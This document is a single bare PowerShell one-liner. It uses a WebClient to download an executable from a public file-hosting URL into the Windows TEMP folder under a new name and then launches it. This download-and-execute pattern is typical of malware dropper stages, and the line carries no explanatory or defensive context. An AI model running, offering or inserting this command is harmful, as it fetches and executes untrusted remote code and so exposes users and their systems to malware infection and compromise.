
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/mjnspx.exe',"$env:TEMP\mjnp.exe");Start-Process ("$env:TEMP\mjnp.exe")

